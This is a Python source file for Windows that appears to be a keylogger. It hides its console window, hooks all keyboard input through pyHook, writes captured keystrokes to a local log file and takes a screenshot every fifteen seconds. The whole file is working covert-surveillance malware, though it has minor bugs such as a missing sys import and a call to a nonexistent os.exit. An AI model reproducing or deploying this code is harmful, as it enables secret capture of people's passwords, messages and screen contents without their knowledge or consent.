import pyHook
import pythoncom
from datetime import *
import os
import pyautogui as screen
import threading
import win32console
import win32gui

window = win32console.GetConsoleWindow()
win32gui.ShowWindow(window,0)


buffer = ""
pause_period = 2
cap_period = 15

last_press = datetime.now()
pause_delta = timedelta(seconds=pause_period)

root_dir = os.path.split(os.path.realpath(sys.argv[0]))[0]
log_file = os.path.join(root_dir, "log_file.txt")
caps_dir = os.path.join(root_dir, "screencaps")

log_semaphore = threading.Semaphore()
name = "keylog"

def log(message):
	if len(message) > 0:

		log_semaphore.acquire()
		with open(log_file, "a") as f:
			write = "{}:\t{}\n".format(datetime.now(), message)
			f.write(write)
			#print(write)

		log_semaphore.release()

def screenshot():
	if not os.path.exists(caps_dir):
		os.mkdir(caps_dir)

	filename = os.path.join(caps_dir, "screen_"+datetime.now().strftime("%Y_%m_%d_%H_%M_%S")+".png")
	screen.screenshot(filename)
	log("---Screeshot taken: saved to {}---".format(filename))

	threading.Timer(cap_period, screenshot).start()

def keypress(event):
	global buffer, last_press

	# THIS CODE BELOW WILL CAUSE THE KEYBOARD TO FREEZE UP AND REQUIRES A RESTART
	# if event.Ascii:
	# 	char = chr(event.Ascii)
	# 	print("char: ", char)
	# 	print("ascii: ", event.Ascii)
	# 	print("id: ", event.KeyID)

	# 	if str(char) == "~":
	# 		log(buffer)
	# 		log("--PROGRAM ENDED--")
	# 		os.exit(1)

	# 	pause = datetime.now()-last_press
	# 	if pause >= pause_delta:
	# 		log(buffer)
	# 		buffer=""

	# 	if event.Ascii==13 or event.KeyID==13:
	# 		buffer += "<ENTER>\n"
	# 	elif event.Ascii==8 or event.KeyID==13:
	# 		buffer += "<BACKSPACE>"
	# 	elif event.Ascii==9 or event.KeyID==13:
	# 		buffer += "<TAB>"
	# 	else:
	# 		buffer += char

	# 	last_log = datetime.now()
	# 	return True
	# return False
	# --------------------------------------------------------------------------
	if event.KeyID:
		char = chr(event.KeyID)
		print("\nchar: ", char)
		print("ascii: ", event.Ascii)
		print("id: ", event.KeyID, "\n")

		if char == "~":
			log(buffer)
			log("--PROGRAM ENDED--")
			os.exit(1)

		pause = datetime.now()-last_press
		if pause >= pause_delta:
			log(buffer)
			buffer=""

		if event.KeyID==8:
			buffer += "<BACKSPACE>"
		elif event.KeyID==9:
			buffer += "<TAB>"
		elif event.KeyID==13:
			buffer += "<ENTER>\n"
		elif event.KeyID==187:
			buffer += "="
		elif event.KeyID==189:
			buffer += "-"
		elif event.KeyID==190:
			buffer += "."
		elif event.KeyID==222:
			buffer += "'"

		else:
			buffer += char

		last_log = datetime.now()
		return True
	return False


hm = pyHook.HookManager()
hm.KeyDown = keypress
hm.HookKeyboard()
keylog = threading.Thread(target=pythoncom.PumpMessages,name=name)

log("--PROGRAM STARTED--")
screenshot()
keylog.run()
